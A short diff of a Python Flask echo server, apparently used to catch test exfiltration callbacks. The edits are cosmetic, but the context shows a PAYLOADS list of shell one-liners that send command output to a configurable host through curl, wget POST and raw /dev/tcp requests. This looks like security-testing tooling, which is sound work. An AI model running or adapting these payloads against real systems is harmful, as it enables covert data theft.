@@ -15,7 +15,6 @@ def handle_record(record: EchoRecord):
 
 
 # SOME
-
 PAYLOADS = [
     f"pwd | curl --data-binary @- http://{HOST}:{PORT}/",
     f'wget --method=POST --body-data="$(pwd)" http://{HOST}:{PORT}/ -O -',
@@ -28,7 +27,6 @@ PAYLOADS = [
     f'b=$(pwd); echo -ne "POST / HTTP/1.1\\r\\nHost: x\\r\\nContent-Length: ${{#b}}\\r\\n\\r\\n$b" > /dev/tcp/{HOST}/{PORT}',
     f"curl http://{HOST}:{PORT}/$(pwd)",
 ]
-
 # SOME end
 
 
@@ -55,16 +53,13 @@ class EchoRecord:
         return f"{request_line}\r\n{headers}"
 
 
-# EchoRecord end
-
 # flask
 app = Flask(__name__)
 
 
 @app.route("/", methods=["POST"])
 def echo():
-    er = EchoRecord(request)
-    handle_record(er)
+    handle_record(EchoRecord(request))
     return "Ok"
 
 
@@ -78,6 +73,7 @@ def echo_path(data):
 
 
 # flask end
+
 
 # run app
 if __name__ == "__main__":
